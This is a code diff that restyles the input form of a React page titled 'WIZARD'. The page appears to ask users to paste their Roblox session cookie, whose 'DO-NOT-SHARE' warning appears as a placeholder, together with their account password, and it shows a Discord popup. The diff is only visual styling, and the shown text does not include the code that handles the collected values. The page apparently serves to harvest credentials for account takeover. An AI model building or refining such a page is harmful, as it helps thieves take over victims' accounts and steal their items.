@@ -158,15 +158,29 @@ const Index = () => {
       />
       <DiscordPopup />
       <div
-        className="relative z-10 w-full max-w-md rounded-2xl bg-card/70 backdrop-blur-xl p-8 border border-border"
-        style={{ boxShadow: "var(--shadow-card)" }}
+        className="relative z-10 w-full max-w-md rounded-2xl p-8 border"
+        style={{
+          background:
+            "linear-gradient(135deg, hsl(0 0% 100% / 0.08), hsl(0 0% 100% / 0.02))",
+          backdropFilter: "blur(24px) saturate(180%)",
+          WebkitBackdropFilter: "blur(24px) saturate(180%)",
+          borderColor: "hsl(0 0% 100% / 0.15)",
+          boxShadow:
+            "0 8px 32px hsl(0 0% 0% / 0.4), inset 0 1px 0 hsl(0 0% 100% / 0.1)",
+        }}
       >
         <h1 className="text-center text-2xl font-bold tracking-[0.4em] mb-8">
           WIZARD
         </h1>
 
         {/* Tabs */}
-        <div className="grid grid-cols-2 gap-1 p-1 rounded-xl bg-secondary border border-border mb-5">
+        <div
+          className="grid grid-cols-2 gap-1 p-1 rounded-xl mb-5 border"
+          style={{
+            background: "hsl(0 0% 100% / 0.05)",
+            borderColor: "hsl(0 0% 100% / 0.1)",
+          }}
+        >
           {(["v1", "v2"] as Version[]).map((v) => (
             <button
               key={v}
@@ -174,9 +188,18 @@ const Index = () => {
               disabled={running}
               className={`py-2.5 rounded-lg text-xs font-bold tracking-[0.3em] transition-all ${
                 version === v
-                  ? "bg-background text-foreground shadow-md"
+                  ? "text-foreground"
                   : "text-muted-foreground hover:text-foreground"
               }`}
+              style={
+                version === v
+                  ? {
+                      background: "hsl(0 0% 100% / 0.12)",
+                      backdropFilter: "blur(12px)",
+                      boxShadow: "inset 0 1px 0 hsl(0 0% 100% / 0.15)",
+                    }
+                  : undefined
+              }
             >
               {v.toUpperCase()}
             </button>
@@ -193,9 +216,14 @@ const Index = () => {
             placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
             disabled={running}
             maxLength={4000}
-            className={`w-full bg-input border rounded-xl pl-11 pr-4 py-3 text-sm tracking-widest placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 transition-colors ${
-              errorMsg ? "border-destructive" : "border-border"
+            className={`w-full border rounded-xl pl-11 pr-4 py-3 text-sm tracking-widest placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 transition-colors ${
+              errorMsg ? "border-destructive" : ""
             }`}
+            style={{
+              background: "hsl(0 0% 100% / 0.06)",
+              backdropFilter: "blur(12px)",
+              borderColor: errorMsg ? undefined : "hsl(0 0% 100% / 0.12)",
+            }}
           />
         </div>
 
@@ -219,9 +247,14 @@ const Index = () => {
               placeholder="Account Password"
               disabled={running}
               maxLength={200}
-              className={`w-full bg-input border rounded-xl pl-11 pr-4 py-3 text-sm placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 transition-colors ${
-                errorMsg ? "border-destructive" : "border-border"
+              className={`w-full border rounded-xl pl-11 pr-4 py-3 text-sm placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 transition-colors ${
+                errorMsg ? "border-destructive" : ""
               }`}
+              style={{
+                background: "hsl(0 0% 100% / 0.06)",
+                backdropFilter: "blur(12px)",
+                borderColor: errorMsg ? undefined : "hsl(0 0% 100% / 0.12)",
+              }}
             />
           </div>
         )}
